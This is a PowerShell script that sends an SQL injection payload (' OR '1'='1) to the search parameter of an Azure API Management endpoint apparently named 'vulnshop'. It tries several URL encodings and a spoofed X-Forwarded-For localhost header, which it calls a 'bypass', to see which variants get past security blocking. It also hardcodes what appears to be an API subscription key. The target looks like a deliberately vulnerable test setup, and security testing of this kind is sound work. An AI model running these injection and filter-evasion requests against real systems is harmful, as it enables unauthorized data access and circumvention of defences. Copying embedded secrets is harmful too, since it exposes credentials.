# compare-encoding.ps1 - Compare different encoding methods

$APIM_URL = "https://apim-vulnshop-t7up5q.azure-api.net/vulnshop"
$KEY = "8722910157d34e698f969cf34c30eeb5"

Write-Host "Comparing Different Encoding Methods" -ForegroundColor Cyan
Write-Host "====================================" -ForegroundColor Cyan

Add-Type -AssemblyName System.Web

# Test payload
$payload = "' OR '1'='1"

# Different encoding methods
$encoding1 = [System.Web.HttpUtility]::UrlEncode($payload)
$encoding2 = "%27+OR+%271%27%3d%271"
$encoding3 = "%27%20OR%20%271%27%3D%271"

Write-Host "`nOriginal payload: $payload" -ForegroundColor Yellow
Write-Host "Method 1 (HttpUtility): $encoding1" -ForegroundColor Gray
Write-Host "Method 2 (Manual with +): $encoding2" -ForegroundColor Gray
Write-Host "Method 3 (Manual with %20): $encoding3" -ForegroundColor Gray

# Test each encoding
Write-Host "`n=== Testing Each Encoding ===" -ForegroundColor Red

@(
    @{Name="HttpUtility.UrlEncode"; Encoded=$encoding1},
    @{Name="Manual with + for spaces"; Encoded=$encoding2},
    @{Name="Manual with %20 for spaces"; Encoded=$encoding3},
    @{Name="No encoding"; Encoded=$payload}
) | ForEach-Object {
    Write-Host "`nTesting: $($_.Name)" -ForegroundColor Magenta
    Write-Host "URL: /api/products?search=$($_.Encoded)" -ForegroundColor Gray
    
    try {
        $response = Invoke-WebRequest -Uri "$APIM_URL/api/products?search=$($_.Encoded)" `
            -Headers @{"Ocp-Apim-Subscription-Key" = $KEY} `
            -UseBasicParsing
            
        Write-Host "[SUCCESS] HTTP $($response.StatusCode) - Got $($response.Content.Length) bytes" -ForegroundColor Green
    } catch {
        if ($_.Exception.Response) {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 401) {
                Write-Host "[AUTH] HTTP 401 - Authentication required" -ForegroundColor Yellow
            } elseif ($status -eq 403) {
                Write-Host "[BLOCKED] HTTP 403 - Forbidden" -ForegroundColor Red
                # Try to get error message
                try {
                    $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                    $errorContent = $reader.ReadToEnd()
                    Write-Host "Error: $errorContent" -ForegroundColor Gray
                } catch {}
            } else {
                Write-Host "[ERROR] HTTP $status" -ForegroundColor Red
            }
        } else {
            Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

Write-Host "`n=== Testing with Bypass Headers ===" -ForegroundColor Red

# Test with bypass header
Write-Host "`nTesting with X-Forwarded-For header..." -ForegroundColor Cyan
try {
    $response = Invoke-WebRequest -Uri "$APIM_URL/api/products?search=$encoding1" `
        -Headers @{
            "Ocp-Apim-Subscription-Key" = $KEY
            "X-Forwarded-For" = "127.0.0.1"
        } `
        -UseBasicParsing
        
    Write-Host "[SUCCESS WITH BYPASS] HTTP $($response.StatusCode)" -ForegroundColor Green
} catch {
    Write-Host "[FAILED] Even with bypass header: HTTP $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
}

Write-Host "`n===================================" -ForegroundColor Cyan
Write-Host "Key Findings:" -ForegroundColor White
Write-Host "- Different encodings may trigger different security rules"
Write-Host "- APIM might have different policies for different patterns"
Write-Host "- Authentication (401) vs Security Block (403) are different" 